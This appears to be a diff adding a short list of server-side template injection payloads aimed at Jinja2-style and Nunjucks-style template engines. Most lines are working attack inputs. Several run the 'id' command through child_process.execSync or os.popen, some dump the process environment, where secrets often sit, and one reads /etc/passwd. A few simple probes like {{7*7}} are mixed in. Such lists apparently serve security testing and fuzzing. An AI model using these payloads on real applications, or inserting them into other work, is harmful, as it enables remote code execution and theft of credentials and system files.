@@ -1,0 +1,19 @@
+{{7*7}}
+{{7*'7'}}
+{{range.constructor("return global.process.env")()}}
+{{range.constructor("return global")().process.env}}
+{{range.constructor("var x=require('child_process').execSync('id').toString();return x")()}}
+{{global.process.env}}
+{{global.process.mainModule.require('child_process').execSync('id').toString()}}
+{%raw%}{{7*7}}{%endraw%}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{range.constructor("return require('child_process').execSync('id').toString()")()}}
+{% for key in "".constructor.prototype %}{{key}}{% endfor %}
+{{(function(){return global.process.env.NODE_ENV})()}}
+{% set x = range.constructor("return process") %}{{x().env}}
+{{range.constructor("return process.mainModule")().require('os').hostname()}}
+{{range.constructor("return process.mainModule")().require('fs').readFileSync('/etc/passwd','utf8')}}
+{% set ns = namespace(found=false) %}
+{{''.__class__.__mro__}}
